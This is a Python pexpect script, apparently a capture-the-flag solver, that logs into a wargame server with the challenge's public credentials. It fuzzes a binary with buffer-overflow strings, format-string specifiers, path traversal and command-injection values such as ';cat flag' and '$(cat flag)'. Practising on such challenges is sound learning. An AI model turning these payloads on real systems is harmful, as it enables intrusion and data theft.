#!/usr/bin/env python3

import pexpect
import time

print("🔥" * 30)
print("EXPLOIT FINAL - LEYENDO CÓDIGO Y EJECUTANDO")
print("🔥" * 30)

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", encoding='utf-8', timeout=30)

try:
    # Login
    child.expect(['password:', 'Password:'])
    child.sendline("basic9")
    child.expect(['\\$'])
    print("[✓] Conectado!")
    
    # Leer el código fuente completo
    print("\n[*] Leyendo código fuente completo...")
    child.sendline("cat basic9.c")
    child.expect(['\\$'], timeout=10)
    source = child.before
    print("="*50)
    print(source)
    print("="*50)
    
    # El programa dice que se debe ejecutar SIN argumentos
    print("\n[*] Ejecutando ./basic9 sin argumentos...")
    child.sendline("./basic9")
    
    # Esperar prompt o input
    index = child.expect([':', '>', 'Enter', 'Input', 'Password', pexpect.TIMEOUT, '\\$'], timeout=5)
    
    if index < 5:  # El programa espera input
        print(f"[*] El programa pide input. Prompt: {child.before}")
        
        # Probar diferentes inputs
        test_inputs = [
            "test",
            "password", 
            "flag",
            "A" * 50,
            "A" * 100,
            "A" * 200,
            "A" * 500,
            "A" * 1000,
            "%x" * 20,
            "%s" * 20,
            "%n" * 10,
            "../flag",
            "/home/basic9/flag",
            "\\x00" * 100,
            "\\xff" * 100,
            "\n" * 10,
            ";cat flag",
            "$(cat flag)",
            "`cat flag`"
        ]
        
        for inp in test_inputs:
            print(f"\n[*] Probando input: {inp[:30]}...")
            
            # Ejecutar de nuevo
            child.sendline("./basic9")
            child.expect([':', '>', 'Enter', 'Input', 'Password', pexpect.TIMEOUT], timeout=3)
            
            # Enviar input
            child.sendline(inp)
            
            # Esperar respuesta
            index = child.expect(['\\$', 'Segmentation', 'flag', 'W3C', pexpect.TIMEOUT], timeout=3)
            
            output = child.before
            
            if index == 1:  # Segfault
                print("[!] SEGFAULT - Buffer overflow confirmado!")
                print(f"[*] Offset aproximado: {len(inp)} bytes")
                
                # Calcular offset exacto
                print("\n[*] Calculando offset exacto...")
                for size in [50, 60, 70, 80, 90, 100, 110, 120, 130, 140, 150]:
                    child.sendline("./basic9")
                    child.expect([':', '>', pexpect.TIMEOUT], timeout=2)
                    child.sendline("A" * size)
                    idx = child.expect(['\\$', 'Segmentation', pexpect.TIMEOUT], timeout=2)
                    if idx == 1:
                        print(f"[!] Segfault con {size} bytes")
                        break
                
            elif index in [2, 3]:  # flag o W3C
                print(f"\n🔥🔥🔥 FLAG ENCONTRADA 🔥🔥🔥")
                print(f"Output: {output}")
                
                # Buscar el patrón exacto
                import re
                patterns = [
                    r'W3C{[^}]+}',
                    r'flag{[^}]+}',
                    r'FLAG{[^}]+}',
                    r'[A-Za-z0-9_]{15,30}'
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, output)
                    if match:
                        print(f"\nFLAG: {match.group(0)}")
                        break
                break
                
            elif output and len(output) > 20:
                # Verificar si hay algo interesante
                if any(word in output for word in ['flag', 'W3C', 'FLAG', 'password', 'Password']):
                    print(f"[!] Output interesante: {output}")
    
    # Si no pide input, ver qué hace
    else:
        output = child.before
        print(f"[*] Output directo: {output}")
    
    # Técnica alternativa: usar ltrace para ver qué hace el programa
    print("\n[*] Analizando con ltrace...")
    child.sendline("echo 'AAAA' | ltrace ./basic9 2>&1")
    child.expect(['\\$'], timeout=5)
    ltrace_out = child.before
    print(f"ltrace: {ltrace_out}")
    
    # Ver si usa gets, scanf, strcpy vulnerable
    if "gets" in ltrace_out:
        print("[!] Usa gets() - VULNERABLE!")
    if "strcpy" in ltrace_out:
        print("[!] Usa strcpy() - VULNERABLE!")
    if "scanf" in ltrace_out:
        print("[!] Usa scanf() - VULNERABLE!")
    
    # Técnica final: Debugging con patrones
    print("\n[*] Generando exploit final...")
    
    # Patrón para encontrar offset exacto
    pattern = ""
    for i in range(26):
        pattern += chr(65+i) * 4  # AAAABBBBCCCC...
    
    child.sendline("./basic9")
    child.expect([':', '>', pexpect.TIMEOUT], timeout=3)
    child.sendline(pattern)
    child.expect(['\\$', 'Segmentation', pexpect.TIMEOUT], timeout=3)
    
    # Una última prueba con input muy largo
    print("\n[*] Último intento con overflow masivo...")
    child.sendline("./basic9")
    child.expect([':', '>', pexpect.TIMEOUT], timeout=3)
    
    # Payload con dirección de retorno potencial
    payload = "A" * 100 + "\\x00\\x00\\x00\\x00" + "B" * 100
    child.sendline(payload)
    child.expect(['\\$', pexpect.TIMEOUT], timeout=3)
    final = child.before
    
    if "W3C" in final or "flag" in final.lower():
        print(f"\n🔥 FLAG: {final} 🔥")
    
except Exception as e:
    print(f"[!] Error: {e}")
finally:
    child.close()

print("\n" + "🔥"*30)